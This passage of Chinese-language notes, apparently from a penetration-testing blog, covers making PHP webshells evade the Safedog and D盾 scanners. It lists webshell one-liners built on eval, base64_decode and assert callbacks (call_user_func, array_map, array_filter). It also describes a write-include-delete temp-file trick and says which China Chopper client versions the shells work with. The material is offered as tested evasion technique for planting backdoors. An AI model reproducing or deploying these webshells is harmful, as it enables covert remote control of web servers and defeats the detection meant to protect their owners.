1.2-

    • 字符串翻转及子串替换；

  • 其它

    • d盾会对base64_decode($_POST[‘T00ls’])中编码函数敏感；其与狗的检测策略不同；
    • 带base64编码的，过狗不一定过盾；

1.3-

  • 原文：https://www.t00ls.net/thread-41389-1-1.html

  • code

  • 注意

    • 2中代码base64编码；
      写入临时缓存文件file，写入文件时base64解码；
      文件包含；
      马上删除，并检测是否删除；
      密码便是2中pass，亲测可行；
    • 也可以对2中代码处fun("trea",$_POST['pass']);变为fun("trea",base64_decode($_POST['pass']));
      再将其base编码赋值给base64；
      加入了base64解码函数，旧版菜刀应付不了，需使用16版并更改配置文件；
      （见下面菜刀版本相关）

  • 小结：

    • @eval($_POST['pass']);———旧版菜刀；
    • @eval(base64_decode($_POST['pass']));————16版并改配置文件；

2.1-回调函数过狗

  • 相关链接https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html

  • 常用函数

    • call_user_func('assert', $_POST['pass']);
    • call_user_func_array('assert', array($_POST['pass']));
    • array_filter(array($_POST['pass']), 'assert');
    • array_map('assert',array($_POST['pass']));

  • code

  • 注意

    • 只能传入变量，因此是$a；
    • assert 在版本5.4.8 增加了参数description，因此加’test’作为参数；
